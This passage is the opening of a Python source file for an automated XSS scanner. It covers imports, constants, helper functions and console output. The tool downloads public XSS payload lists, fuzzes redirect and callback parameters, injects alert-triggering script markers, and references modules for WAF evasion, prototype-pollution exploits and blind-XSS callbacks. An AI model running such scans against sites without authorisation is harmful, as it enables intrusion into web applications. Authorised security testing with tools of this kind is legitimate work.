#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XOX$$ - Advanced, persistent, context-aware XSS scanner.

Highlights
----------
* Context-aware payload selection (HTML / attribute / script / comment / JSON / URL)
* HTTP-first probing, browser verification only for real candidates (fast + low FP)
* Runtime DOM sink instrumentation (innerHTML / eval / document.write / setTimeout ...)
* Persistent scan state: resume interrupted scans, dedupe findings across runs
* Retries, backoff, rate limiting, circuit-friendly HTTP engine with response cache
* Optional passive recon: subdomains, historic URLs, OpenAPI, JS intelligence
* WAF fingerprinting + tamper/encoder chains
* Blind-XSS confirmation through interactsh or callback/file pollers
* Reports: console, JSON, Markdown, self-contained HTML, optional screenshots
* Graceful degradation: works without Selenium (`--no-browser`) and without uvloop (Windows)

Authorised testing only. You are responsible for the targets you scan.
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import copy
import hashlib
import html
import json
import os
import random
import re
import shutil
import shlex
import socket
import string
import sys
import tempfile
import textwrap
import threading
import time
import traceback
import urllib.parse
import urllib.request
import uuid
import warnings
from collections import Counter
from contextlib import asynccontextmanager, suppress
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import TYPE_CHECKING, Any, Dict, List, Optional, Sequence, Set, Tuple
from urllib.parse import (
    parse_qsl,
    quote,
    urlencode,
    urljoin,
    urlsplit,
    urlunsplit,
)

# Advanced modules
try:
    from xoxss.analysis.polyglot import PolyglotGenerator as PolyglotPayloadGenerator
    from xoxss.analysis.per_char import PerCharProbe
    from xoxss.analysis.jsonp import JSONPAnalyzer as JSONPDetector
    from xoxss.analysis.csp import CSPAnalyzer
    from xoxss.analysis.cors import CORSAnalyzer
    from xoxss.analysis.mxss import MXSSDetector
    from xoxss.analysis.proto_pollution import (
        PROTO_MARKER_KEY,
        PROTO_PROBE_JS,
        PrototypePollutionDetector,
        build_proto_exploit,
        build_proto_probes,
        gadget_exploit_names,
    )
    from xoxss.analysis.rate_limit import SmartRateLimiter
    from xoxss.analysis.dom_clobbering import DOMClobberingDetector
    from xoxss.analysis.trusted_types import TrustedTypesAnalyzer
    from xoxss.analysis.graphql import GraphQLAnalyzer
    from xoxss.analysis.websocket import WebSocketAnalyzer
    from xoxss.analysis.file_upload import FileUploadAnalyzer
    from xoxss.analysis.postmessage import PostMessageAnalyzer
    from xoxss.detection.payload import build_blind_payloads
    HAS_ADVANCED = True
except Exception:
    HAS_ADVANCED = False
    build_blind_payloads = None  # type: ignore
    PROTO_MARKER_KEY = "xoxss"  # type: ignore
    PROTO_PROBE_JS = ""  # type: ignore
    PrototypePollutionDetector = None  # type: ignore
    build_proto_exploit = None  # type: ignore
    build_proto_probes = None  # type: ignore
    gadget_exploit_names = None  # type: ignore

try:
    from xoxss.detection.waf import (
        BLOCK_WORDS,
        BODY_SIGNATURES,
        HEADER_SIGNATURES,
        fingerprint as fingerprint_waf,
        looks_blocked,
    )
except Exception:  # pragma: no cover - keeps the scanner importable in isolation
    HEADER_SIGNATURES = {}  # type: ignore
    BODY_SIGNATURES = {}  # type: ignore
    BLOCK_WORDS = ()  # type: ignore
    fingerprint_waf = None  # type: ignore
    looks_blocked = None  # type: ignore

from xoxss.tools.external import ExternalFinding, ExternalToolkit, available_tools

# Recon / analysis / OOB / external-tool integration.  Imports are guarded so a
# partially installed checkout still exposes the core scanner.
try:
    from xoxss.analysis.ast_taint import analyze_javascript as analyze_js_taint
    from xoxss.analysis.ast_taint import summarize_flows as summarize_taint_flows
    from xoxss.detection.encoders import (
        apply_chain as apply_encoder_chain,
        describe_encoders,
        encoder_names,
        get_encoder,
    )
    from xoxss.oob import CallbackPoller, FilePoller, InteractshClient, OOBManager
    from xoxss.recon.jsintel import (
        JSIntel,
        analyze_javascript_intel,
        extract_attr_urls,
        extract_html_parameters,
        extract_inline_scripts,
        extract_script_urls,
        sources_from_sourcemap,
    )
    from xoxss.recon.openapi import APIOperation, OpenAPIFinder
    from xoxss.recon.passive import PassiveURLCollector
    from xoxss.recon.subdomains import SubdomainFinder, root_domain
    from xoxss.scan.fuzzer import (
        FUZZ_EXTENSIONS,
        PARAM_WORDS,
        DirFuzzer,
        ParameterMiner,
    )
    HAS_RECON = True
except Exception as _recon_exc:  # pragma: no cover
    HAS_RECON = False
    _RECON_IMPORT_ERROR = str(_recon_exc)
    analyze_js_taint = None  # type: ignore
    summarize_taint_flows = None  # type: ignore
    apply_encoder_chain = None  # type: ignore
    describe_encoders = None  # type: ignore
    encoder_names = lambda: []  # type: ignore
    get_encoder = None  # type: ignore
    CallbackPoller = FilePoller = InteractshClient = OOBManager = None  # type: ignore
    JSIntel = object  # type: ignore
    analyze_javascript_intel = None  # type: ignore
    extract_attr_urls = extract_html_parameters = extract_inline_scripts = None  # type: ignore
    extract_script_urls = sources_from_sourcemap = None  # type: ignore
    APIOperation = object  # type: ignore
    OpenAPIFinder = None  # type: ignore
    PassiveURLCollector = None  # type: ignore
    SubdomainFinder = root_domain = None  # type: ignore
    FUZZ_EXTENSIONS = ()  # type: ignore
    PARAM_WORDS = ()  # type: ignore
    DirFuzzer = ParameterMiner = None  # type: ignore

try:
    from xoxss.scan.parameters import ParameterHarvester, ReflectionProbe
    HAS_PARAM_AUDIT = True
except Exception as _param_exc:  # pragma: no cover
    HAS_PARAM_AUDIT = False
    _PARAM_IMPORT_ERROR = str(_param_exc)
    ParameterHarvester = None  # type: ignore
    ReflectionProbe = None  # type: ignore


from xoxss.reports.sarif import (  # noqa: E402
    build_sarif_document,
    sarif_rule_id,
)
from xoxss.reports.html import write_html_report
from xoxss.reports.json import report_payload, write_json_report
from xoxss.reports.markdown import write_markdown_report
from xoxss.scan.reflection import ReflectionInfo, analyze_reflection, browser_prequalified
from xoxss.detection.matrix import (
    analyze_character_matrix,
    build_matrix_probe,
    format_matrix_summary,
)
from xoxss.scan.vectors import PATH_MARKER, build_path_vectors, render_path_payload

try:
    from xoxss.analysis.ai import (
        DEFAULT_AI_ENDPOINT,
        DEFAULT_AI_MODEL,
        AIAnalyzer,
        resolve_ai_key,
        resolve_ai_model,
    )
    HAS_AI = True
except Exception:  # pragma: no cover - optional integration edge case
    HAS_AI = False
    AIAnalyzer = None  # type: ignore
    DEFAULT_AI_ENDPOINT = ""  # type: ignore
    DEFAULT_AI_MODEL = ""  # type: ignore
    resolve_ai_key = lambda *args, **kwargs: ""  # type: ignore
    resolve_ai_model = lambda *args, **kwargs: ""  # type: ignore
from xoxss.core.evidence import (
    canonical_finding_url,
    finding_id as make_finding_id,
    finding_curl,
    parse_curl_request,
    parse_oob_context,
    request_to_dict,
    response_excerpt,
)
from xoxss.core.http import HttpEngine, HttpResponse, RateLimiter, USER_AGENT
from xoxss.core.state import StateStore
from xoxss.cli import EXAMPLES, build_parser as _build_cli_parser
from xoxss.analysis.mutation_probe import (
    MutationObservation,
    apply_observed_normalization,
    build_probes,
    observe,
    reverse_normalization,
)
from xoxss.analysis.payload_grammar import assemble_variants
from xoxss.engine.crawler import COMMON_ENDPOINTS, CrawlerMixin
from xoxss.utils.urlpolicy import (
    DANGEROUS_PATH_WORDS,
    SCANNABLE_EXTENSIONS,
    SKIP_EXTENSIONS,
    looks_like_dangerous,
    looks_like_page,
    looks_like_scan_target,
    normalize_scan_url,
)

# Backwards-compatible name used throughout the scanner.
normalize_url = normalize_scan_url

try:
    from xoxss.utils import ui as _ui
except Exception:  # pragma: no cover - standalone checkout edge case
    _ui = None

if TYPE_CHECKING:  # pragma: no cover - typing only, never executed
    # BeautifulSoup is optional at runtime but used in the helper's annotation.
    from bs4 import BeautifulSoup as BeautifulSoupType

try:  # required
    import aiohttp

    HAS_AIOHTTP = True
except Exception:  # pragma: no cover
    aiohttp = None  # type: ignore
    HAS_AIOHTTP = False

try:  # required
    from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
    try:
        from bs4 import XMLParsedAsHTMLWarning
    except ImportError:
        XMLParsedAsHTMLWarning = None

    HAS_BS4 = True
    warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)
    if XMLParsedAsHTMLWarning is not None:
        warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
    warnings.filterwarnings("ignore", module=r"bs4(\..*)?")
except Exception:  # pragma: no cover
    BeautifulSoup = None  # type: ignore
    HAS_BS4 = False


def _soup(html_text: str) -> BeautifulSoupType:
    """Parse HTML, raising a clear error when BeautifulSoup is unavailable."""
    if BeautifulSoup is None:
        raise RuntimeError("beautifulsoup4 is required: pip install -r requirements.txt")
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        return BeautifulSoup(html_text, "html.parser")


APP_NAME = "XOX$$"
VERSION = "2.0.0"
CODENAME = "PERSISTENT"
DEFAULT_STATE_DIR = ".xoxss"

# Remote payload lists. They are downloaded to the system temp directory at start-up
# (``/tmp`` on POSIX, ``%TEMP%`` on Windows) and removed when the scan finishes.
PAYLOAD_SOURCES: Tuple[str, ...] = (
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-payloadbox.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-Bypass-Strings-BruteLogic.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md",
)
MAX_PAYLOAD_BYTES = 4 * 1024 * 1024
MAX_REMOTE_PAYLOADS = 5000

# Parameter names tried on discovered endpoints that show evidence of accepting query parameters.
# Organised by sink category with fallback usage only after HTML/JS discovery.
FUZZ_PARAM_NAMES: Tuple[str, ...] = (
    # search / user input
    "q", "s", "search", "query", "keyword", "keywords", "term", "filter",
    "name", "id", "page", "title", "content", "text", "input", "value",
    "email", "username", "user", "userid", "account",
    # redirect / URL sinks (high value: open redirect to javascript: URIs)
    "redirect_url", "redirect_uri", "redirectTo", "returnTo", "return_url",
    "return_uri", "ruri", "next_url", "continueUrl", "goto", "dest",
    "destination", "forward", "link", "path", "uri", "u", "to", "rurl",
    "url", "redirect", "return", "returnUrl", "next", "continue",
    "callback", "cb", "go", "target", "out", "jump", "r", "host",
    # template / rendering sinks (view engines, themes, locales)
    "template", "tpl", "view", "section", "lang", "locale", "format",
    "mode", "sort", "order", "action", "type", "page_id", "layout", "theme",
    # content / UI / messaging
    "comment", "msg", "body", "description", "summary", "message",
    # error / status / fragment sinks
    "error", "errors", "status", "code", "reason", "note",
    "hl", "q0", "s0", "sh", "redir", "u1", "d", "x",
)


def endpoint_accepts_query_params(url: str, response_text: str = "") -> bool:
    """Gate 1: Verify whether the endpoint shows evidence of accepting query parameters.

    Prevents blind parameter fuzzing on static or non-query endpoints.
    Accepts if:
      - The URL already contains a query string, OR
      - The response body or inline scripts reference '?', 'location.search', or 'URLSearchParams'.
    """
    if bool(urlsplit(url).query):
        return True
    if not response_text:
        return False
    return (
        "?" in response_text
        or "location.search" in response_text
        or "URLSearchParams" in response_text
    )

# Patterns used to pull API routes out of inline/external JavaScript.
JS_ENDPOINT_PATTERNS = (
    re.compile(
        r"""\b(?:fetch|axios\.(?:get|post|put|patch|delete)|\.open)\s*\(\s*["'`]([^"'`\s]{1,500})["'`]""",
        re.I,
    ),
    re.compile(
        r"""\b(?:url|endpoint|api|path|action|href|src)\s*[:=]\s*["'`]([^"'`\s]{1,500})["'`]""",
        re.I,
    ),
    re.compile(r"""["'`]((?:https?://|/|\./|\.\./)[^"'`\s<>]{1,500})["'`]""", re.I),
)

# Known vulnerable JavaScript libraries (simplified retire.js-style database)
# Format: library_name -> (min_vulnerable_version, max_vulnerable_version, cve_id, severity)
VULNERABLE_LIBS = {
    "jquery": {
        "1.0.0": ("1.0.0", "1.12.4", "CVE-2019-11358", "high"),
        "2.0.0": ("2.0.0", "2.2.4", "CVE-2019-11358", "high"),
        "3.0.0": ("3.0.0", "3.4.0", "CVE-2020-11022,CVE-2020-11023", "high"),
    },
    "angular": {
        "1.0.0": ("1.0.0", "1.7.9", "CVE-2018-8005", "medium"),
        "2.0.0": ("2.0.0", "2.4.10", "CVE-2018-8005", "medium"),
        "4.0.0": ("4.0.0", "4.5.9", "CVE-2018-8005", "medium"),
        "5.0.0": ("5.0.0", "5.2.9", "CVE-2018-8005", "medium"),
    },
    "react": {
        "0.0.0": ("0.0.0", "0.14.9", "CVE-2016-10742", "medium"),
        "15.0.0": ("15.0.0", "15.6.2", "CVE-2018-6343", "medium"),
        "16.0.0": ("16.0.0", "16.3.0", "CVE-2018-6343", "medium"),
    },
    "vue": {
        "0.0.0": ("0.0.0", "2.5.16", "CVE-2018-19687", "medium"),
    },
    "bootstrap": {
        "1.0.0": ("1.0.0", "1.4.0", "CVE-2019-8331", "medium"),
        "2.0.0": ("2.0.0", "2.3.2", "CVE-2019-8331", "medium"),
        "3.0.0": ("3.0.0", "3.4.1", "CVE-2019-8331", "medium"),
        "4.0.0": ("4.0.0", "4.3.1", "CVE-2019-8331", "medium"),
    },
    "d3": {
        "0.0.0": ("0.0.0", "3.5.16", "CVE-2018-12411", "medium"),
    },
    "handlebars": {
        "0.0.0": ("0.0.0", "4.0.11", "CVE-2019-20933", "high"),
    },
    "lodash": {
        "0.0.0": ("0.0.0", "4.17.14", "CVE-2019-10744", "high"),
    },
    "moment": {
        "0.0.0": ("0.0.0", "2.24.0", "CVE-2019-13555", "medium"),
    },
    "axios": {
        "0.0.0": ("0.0.0", "0.19.0", "CVE-2020-28168", "medium"),
    },
    "ckeditor": {
        "0.0.0": ("0.0.0", "4.11.4", "CVE-2019-8197", "high"),
    },
    "tinymce": {
        "0.0.0": ("0.0.0", "4.9.11", "CVE-2019-17571", "high"),
    },
    "prototype": {
        "0.0.0": ("0.0.0", "1.7.3", "CVE-2015-1830", "high"),
    },
    "scriptaculous": {
        "0.0.0": ("0.0.0", "1.9.0", "CVE-2015-1830", "high"),
    },
    "swfobject": {
        "0.0.0": ("0.0.0", "2.2.0", "CVE-2018-12446", "medium"),
    },
}

# --------------------------------------------------------------------------------------
# Terminal colours
# --------------------------------------------------------------------------------------


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    DIM = "\033[2m"
    PURPLE = "\033[95m"
    PARAM = "\033[96m"
    CYAN = "\033[96m"
    GREY = "\033[90m"

    @classmethod
    def disable(cls) -> None:
        for name in list(vars(cls)):
            if name.isupper():
                setattr(cls, name, "")


# --------------------------------------------------------------------------------------
# Small helpers
# --------------------------------------------------------------------------------------


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def slugify(value: str, maxlen: int = 48) -> str:
    slug = re.sub(r"[^a-zA-Z0-9._-]+", "-", value).strip("-")
    return (slug or "target")[:maxlen]


def truncate(text: Any, limit: int = 400) -> str:
    text = str(text)
    if len(text) <= limit:
        return text
    return text[: limit - 3] + "..."


def strip_ansi(text: str) -> str:
    return re.sub(r"\033\[[0-9;]*m", "", text)


def sanitize_text(text: Any, limit: int = 100000) -> str:
    """Escape control characters but keep newlines and our own SGR colour codes."""
    s = str(text).replace("\r", "\\r").replace("\x00", "\\0")
    # Neutralise every escape sequence except SGR colour codes (ESC[...m).
    s = re.sub(r"\x1b(?!\[[0-9;]*m)", lambda m: "\\x1b", s)
    s = re.sub(r"[\x01-\x08\x0b\x0c\x0e-\x1a\x1c-\x1f\x7f]", lambda m: "\\x%02x" % ord(m.group()), s)
    return s[:limit]


def fmt_duration(seconds: float) -> str:
    seconds = max(0.0, float(seconds))
    if seconds < 60:
        return f"{seconds:.2f}s"
    minutes, sec = divmod(int(seconds), 60)
    hours, minutes = divmod(minutes, 60)
    if hours:
        return f"{hours}h {minutes}m {sec}s"
    return f"{minutes}m {sec}s"


def unique_token(prefix: str = "z", length: int = 9) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return prefix + "".join(random.choice(alphabet) for _ in range(length))


def js_marker(token: str) -> str:
    """Quote-free JS snippet that records `token` in window.__xoxss_hits and triggers window.alert.

    Quote-free matters: the same marker is embedded inside single quoted,
    double quoted and unquoted HTML attributes without breaking them.
    """
    codes = ",".join(str(ord(ch)) for ch in token)
    return (
        f"/*{token}*/window.__xoxss_hits=(window.__xoxss_hits||[]);"
        f"window.__xoxss_hits.push(String.fromCharCode({codes}));"
        f"try{{window.alert(String.fromCharCode({codes}))}}catch(e){{}}"
    )


_DIALOG_CALL_RE = re.compile(
    r"\b(?P<fn>alert|confirm|prompt)\s*(?:`\s*1\s*`|\(\s*(?:1|'1'|\"1\"|`1`|)\s*\))",
    re.I,
)
_AI_DIALOG_RE = _DIALOG_CALL_RE


def mark_ai_payload(payload: str, token: str) -> str:
    """Make an AI candidate attributable without changing its breakout.

    The dialog argument is replaced with a value that is both a JS comment (so
    the reflection analyser can locate it) and a runtime string (so browser
    instrumentation records the hit).  Candidates without a recognised dialog
    call get an appended marker statement.
    """
    codes = ",".join(str(ord(ch)) for ch in token)
    call = f"/*{token}*/String.fromCharCode({codes})"
    replaced = _AI_DIALOG_RE.sub(lambda match: f"{match.group('fn')}({call})", payload)
    if replaced != payload:
        return replaced
    return (
        payload
        + f";/*{token}*/window.__xoxss_hits=(window.__xoxss_hits||[]);"
        + f"window.__xoxss_hits.push(String.fromCharCode({codes}));"
        + f"try{{window.alert(String.fromCharCode({codes}))}}catch(e){{}}"
    )


def replace_query_param(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    out: List[Tuple[str, str]] = []
    replaced = False
    for key, old in pairs:
        if key == param and not replaced:
            out.append((key, value))
            replaced = True
        else:
            out.append((key, old))
    if not replaced:
        out.append((param, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(out, doseq=True), ""))


def merge_query(url: str, extra: Dict[str, str]) -> str:
    parts = urlsplit(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    out: List[Tuple[str, str]] = []
    remaining = dict(extra)
    for key, old in pairs:
        if key in remaining:
            out.append((key, remaining.pop(key)))
        else:
            out.append((key, old))
    out.extend(remaining.items())
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(out, doseq=True), ""))


def extract_endpoints_from_text(text: str, base_url: str) -> List[str]:
    """Extract API routes / page URLs from HTML or JavaScript source."""
    if not text:
        return []
    found: List[str] = []
    seen: Set[str] = set()
    for pattern in JS_ENDPOINT_PATTERNS:
        for match in pattern.finditer(text):
            raw = match.group(1).strip()
            if not raw or len(raw) > 500:
                continue
            # Skip template expressions, markup fragments and escaped strings.
            if any(marker in raw for marker in ("${", "{", "}", "<", ">", "\\", " ")):
                continue
            lowered = raw.lower()
            if lowered.startswith(("javascript:", "data:", "mailto:", "tel:", "#", "blob:")):
                continue
            if lowered.endswith(
                (
                    ".js", ".mjs", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
                    ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webm", ".mp3",
                )
            ):
                continue
            if raw.startswith("//"):
                raw = urlsplit(base_url).scheme + ":" + raw
            absolute = urljoin(base_url, raw)
            parts = urlsplit(absolute)
            if parts.scheme not in ("http", "https") or not parts.netloc:
                continue
            normalized = normalize_url(absolute)
            if normalized in seen:
                continue
            seen.add(normalized)
            found.append(absolute)
    return found


# --------------------------------------------------------------------------------------
# Console
# --------------------------------------------------------------------------------------


class Console:
    """Thread-safe console with optional live status line and file logging."""

    def __init__(
        self,
        verbose: bool = False,
        quiet: bool = False,
        log_file: Optional[str] = None,
        events_file: Optional[str] = None,
    ):
        self.verbose = verbose
        self.quiet = quiet
        self._lock = threading.RLock()
        self._status_text = ""
        self._status_thread: Optional[threading.Thread] = None
        self._status_stop = threading.Event()
        self._status_enabled = (not quiet) and sys.stdout.isatty()
        self.counts: Counter = Counter()
        self._log_path: Optional[Path] = None
        self._events_path: Optional[Path] = Path(events_file) if events_file else None
        self._events_error_reported = False
        self._width_cache: Tuple[float, int] = (0.0, 100)
        if log_file:
            self._log_path = Path(log_file)
            self._log_path.parent.mkdir(parents=True, exist_ok=True)
            try:
                self._log_path.write_text("", encoding="utf-8")
            except OSError:
                self._log_path = None

    def event(self, name: str, **fields: Any) -> None:
        """Write one versioned JSONL event for automation and live monitoring."""
        if self._events_path is None:
            return
        event = {
            "schema_version": 1,
            "timestamp": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
            "event": name,
            **fields,
        }
        try:
            self._events_path.parent.mkdir(parents=True, exist_ok=True)
            with self._lock:
                with self._events_path.open("a", encoding="utf-8") as handle:
                    handle.write(json.dumps(event, ensure_ascii=False, default=str) + "\n")
        except OSError as exc:
            if not self._events_error_reported:
                self._events_error_reported = True
                self.warn(f"Cannot write event stream {self._events_path}: {exc}")

    # -- status line ------------------------------------------------------------------
    def start_status(self) -> None:
        if not self._status_enabled or self._status_thread is not None:
            return
        self._status_stop.clear()
        self._status_thread = threading.Thread(target=self._status_loop, daemon=True)
        self._status_thread.start()

    def stop_status(self) -> None:
        self._status_stop.set()
        if self._status_thread is not None:
            self._status_thread.join(timeout=1.0)
            self._status_thread = None
        with self._lock:
            self._clear_status_locked()

    def set_status(self, text: str) -> None:
        with self._lock:
            self._status_text = text

    def _status_loop(self) -> None:
        last_drawn = ""
        while not self._status_stop.wait(0.5):
            with self._lock:
                try:
                    if self._status_text and self._status_text != last_drawn:
                        sys.stdout.write("\r\033[K" + self._status_text)
                        sys.stdout.flush()
                        last_drawn = self._status_text
                except Exception:
                    pass

    def _clear_status_locked(self) -> None:
        if self._status_enabled:
            try:
                sys.stdout.write("\r\033[K")
                sys.stdout.flush()
            except Exception:
                pass

    # -- printing ---------------------------------------------------------------------
    def _width(self) -> int:
        now = time.monotonic()
        cached_at, cached = self._width_cache
        if now - cached_at < 1.0:
            return cached
        try:
            width = max(60, shutil.get_terminal_size((110, 30)).columns)
        except Exception:
            width = 100
        self._width_cache = (now, width)
        return width

    @staticmethod
    def _prefix(level: str) -> str:
        labels = {"info": "[*]", "ok": "[+]", "warn": "[!]", "error": "[-]", "debug": "[>]", "raw": ""}
        colors = {
            "info": bcolors.OKBLUE,
            "ok": bcolors.OKGREEN,
            "warn": bcolors.WARNING,
            "error": bcolors.FAIL,
            "debug": bcolors.GREY,
            "raw": "",
        }
        label = labels.get(level, "")
        if not label:
            return ""
        colour = colors.get(level, "")
        if not colour:
            return f"{label} "
        if level == "error":
            # Errors stay loud: bold red, no subtlety.
            return f"{bcolors.FAIL}{bcolors.BOLD}{label}{bcolors.ENDC} "
        # Dim brackets, loud glyph - the level reads instantly when scrolling.
        return (
            f"{bcolors.GREY}[{bcolors.ENDC}{colour}{label[1]}{bcolors.ENDC}"
            f"{bcolors.GREY}]{bcolors.ENDC} "
        )

    def rule(self, text: str = "", *, important: bool = True) -> None:
        """Styled section header (`-- TITLE ---------------` on plain encodings)."""
        if self.quiet:
            return
        if _ui is not None:
            line = _ui.rule(text, width=self._width() - 1)
        else:
            line = f"-- {text.upper()} ".ljust(self._width(), "-")
        self._emit("raw", line, important=True)

    def _wrap(self, message: str, width: int) -> str:
        lines: List[str] = []
        for raw in message.splitlines() or [""]:
            wrapped = textwrap.wrap(
                raw,
                width=max(20, width),
                break_long_words=False,   # keep PoC URLs / curl commands copy-paste intact
                break_on_hyphens=False,
            )
            lines.extend(wrapped or [""])
        return "\n".join(lines)

    def _emit(self, level: str, message: str, important: bool = False) -> None:
        if self.quiet and not important:
            return
        if level == "debug" and not self.verbose:
            return
        width = self._width()
        prefix = self._prefix(level)
        if level == "raw":
            # Hand-formatted output (banner, rules, tables, panels) is laid out
            # by its caller; re-wrapping it would break columns and rules.
            body_lines = sanitize_text(message).split("\n")
        else:
            body = self._wrap(sanitize_text(message), width - 4)
            body_lines = body.split("\n")
        text = prefix + body_lines[0]
        for line in body_lines[1:]:
            text += "\n    " + line

        with self._lock:
            self.counts[level] += 1
            self._clear_status_locked()
            try:
                sys.stdout.write(text + "\n")
                sys.stdout.flush()
            except UnicodeEncodeError:
                enc = getattr(sys.stdout, "encoding", "ascii") or "ascii"
                sys.stdout.write(text.encode(enc, "replace").decode(enc, "replace") + "\n")
                sys.stdout.flush()
            except Exception:
                pass
            if self._status_text and self._status_enabled:
                try:
                    sys.stdout.write("\r\033[K" + self._status_text)
                    sys.stdout.flush()
                except Exception:
                    pass
            if self._log_path is not None:
                try:
                    with self._log_path.open("a", encoding="utf-8", errors="replace") as handle:
                        handle.write(f"{now_iso()} {strip_ansi(text)}\n")
                except OSError:
                    pass

    def info(self, message: str, important: bool = False) -> None:
        self._emit("info", message, important)

    def ok(self, message: str, important: bool = True) -> None:
        self._emit("ok", message, important)

    def warn(self, message: str, important: bool = True) -> None:
        self._emit("warn", message, important)

    def error(self, message: str, important: bool = True) -> None:
        self._emit("error", message, important)

    def debug(self, message: str) -> None:
        self._emit("debug", message)

    def raw(self, message: str = "") -> None:
        self._emit("raw", message, important=True)

    def finding(self, finding: "Finding") -> None:
        confidence = finding.confidence or "low"
        confidence_style = {
            "confirmed": f"{bcolors.FAIL}{bcolors.BOLD}",
            "high": f"{bcolors.WARNING}{bcolors.BOLD}",
            "medium": f"{bcolors.WARNING}",
            "low": f"{bcolors.GREY}",
        }.get(confidence, bcolors.ENDC)
        lines = [
            f"{bcolors.BOLD}{finding.kind}{bcolors.ENDC}  "
            f"{confidence_style}[{confidence.upper()}]{bcolors.ENDC}",
            f"{bcolors.GREY}URL        :{bcolors.ENDC} {finding.url}",
            f"{bcolors.GREY}Parameter  :{bcolors.ENDC} {finding.parameter} ({finding.method})",
            f"{bcolors.GREY}Payload    :{bcolors.ENDC} {finding.payload}",
        ]
        if finding.context:
            lines.append(f"{bcolors.GREY}Context    :{bcolors.ENDC} {finding.context}")
        if finding.evidence:
            lines.append(f"{bcolors.GREY}Evidence   :{bcolors.ENDC} {truncate(finding.evidence, 240)}")
        if finding.detail:
            lines.append(f"{bcolors.GREY}Detail     :{bcolors.ENDC} {finding.detail}")
        if self.verbose and finding.confidence_rationale:
            lines.append(
                f"{bcolors.GREY}Rationale  :{bcolors.ENDC} {finding.confidence_rationale}"
            )
        if finding.screenshot:
            lines.append(f"{bcolors.GREY}Screenshot :{bcolors.ENDC} {finding.screenshot}")
        if finding.poc_url:
            lines.append(
                f"{bcolors.GREY}PoC URL    :{bcolors.ENDC} {finding.poc_url}"
            )
        if finding.poc_command:
            lines.append(
                f"{bcolors.GREY}PoC command:{bcolors.ENDC} {finding.poc_command}"
            )
        if finding.finding_id:
            lines.append(
                f"{bcolors.GREY}Id         :{bcolors.ENDC} {finding.finding_id}"
            )
        self._emit("ok", "\n".join(lines), important=True)


# --------------------------------------------------------------------------------------
# Banner
# --------------------------------------------------------------------------------------

BANNER_UNICODE = r"""
██╗  ██╗ ██████╗ ██╗  ██╗ ███████╗ ███████╗
╚██╗██╔╝██╔═══██╗╚██╗██╔╝ ██╔════╝ ██╔════╝
 ╚███╔╝ ██║   ██║ ╚███╔╝  ███████╗ ███████╗
 ██╔██╗ ██║   ██║ ██╔██╗  ╚════██║ ╚════██║
██╔╝ ██╗╚██████╔╝██╔╝ ██╗ ███████║ ███████║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚══════╝ ╚══════╝
"""

BANNER_ASCII = r"""
 __  __  ____  __  __   ___   ___
 \ \/ / / __ \ \ \/ /  / _ \ / _ \
  \  / | |  | | \  /  | | | | | | |
  /  \ | |__| | /  \  | |_| | |_| |
 /_/\_\ \____/ /_/\_\  \___/ \___/
"""


def banner(console: Optional[Console] = None) -> None:
    art = BANNER_UNICODE
    encoding = getattr(sys.stdout, "encoding", None) or "utf-8"
    try:
        art.encode(encoding)
    except (UnicodeEncodeError, LookupError):
        art = BANNER_ASCII

    painted = _ui.paint_ramp(art) if _ui is not None else None
    if painted is None:
        if art is BANNER_ASCII:
            painted = f"{bcolors.OKCYAN}{art}{bcolors.ENDC}"
        else:
            painted = art.replace("█", f"{bcolors.OKCYAN}█{bcolors.ENDC}").replace(
                "╗", f"{bcolors.OKCYAN}╗{bcolors.ENDC}"
            )

    subtitle = (
        f"  {bcolors.BOLD}{bcolors.OKCYAN}{APP_NAME}{bcolors.ENDC}"
        f"{bcolors.DIM}  -  Advanced Automated XSS Scanner  -  v{VERSION}{bcolors.ENDC}"
        f"  {bcolors.WARNING}{bcolors.BOLD}{CODENAME}{bcolors.ENDC}"
    )
    meta = (
        f"  {bcolors.DIM}stateful / context-aware / browser-verified / "
        f"{CODENAME.lower()}{bcolors.ENDC}"
    )
    if _ui is not None and _ui.enabled():
        underline = _ui.rule("", width=46)
        meta = f"{meta}\n  {underline}"
    text = f"{painted}\n{subtitle}\n{meta}"
    if console is not None:
        console.raw(text)
    else:
        print(text)


def briefing_rows(args: argparse.Namespace, target: str) -> List[Tuple[str, str]]:
    """Return the compact rows shown in the pre-scan operation briefing."""
    profile = str(getattr(args, "profile", "balanced") or "balanced")
    if getattr(args, "no_browser", False):
        mode = "http-only"
    else:
        browser = str(getattr(args, "browser", "firefox") or "firefox")
        visibility = "headless" if getattr(args, "headless", False) else "headed"
        mode = f"{browser} ({visibility})"

    pacing = []
    if getattr(args, "threads", None):
        pacing.append(f"{getattr(args, 'threads')} workers")
    if getattr(args, "concurrency", None):
        pacing.append(f"{getattr(args, 'concurrency')} req")
    if pacing:
        mode += " / " + " / ".join(str(item) for item in pacing)

    vectors = ["query/form"]
    vector_flags = (
        ("crawl", "crawl"),
        ("deep", "deep"),
        ("discover", "discover"),
